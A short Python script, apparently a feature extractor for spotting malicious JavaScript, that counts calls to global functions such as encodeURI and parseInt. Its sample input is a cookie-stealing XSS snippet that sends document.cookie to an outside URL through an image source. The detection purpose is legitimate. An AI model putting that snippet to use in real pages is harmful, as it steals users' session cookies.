import re


def calculate_score(js_content: str) -> int:
    # 定义全局函数和正则表达式
    functions = [
        "parseInt",
        "parseFloat",
        "decodeURIComponent",
        "decodeURI",
        "encodeURI",
        "encodeURIComponent",
    ]
    # 匹配完整的、独立的func字符串，而不是作为其他字符串的一部分。r"\b"表示单词的开始或结束边界。
    regex_patterns = [re.compile(r"\b" + func + r"\b") for func in functions]

    # 统计每个函数的使用次数
    counts = {
        func: len(pattern.findall(js_content))
        for func, pattern in zip(functions, regex_patterns)
    }
    total_count = sum(counts.values())
    return total_count


if __name__ == "__main__":
    js_content = """
    <script language="javascript">
    var url = "http://www.trusted.com/index.html?cookie=";
    url = url + encodeURI(document.cookie);
    document.getElementById("pic").src=url;</script>
    """
    res = calculate_score(js_content)
    print(f"js global functions count:{res}")
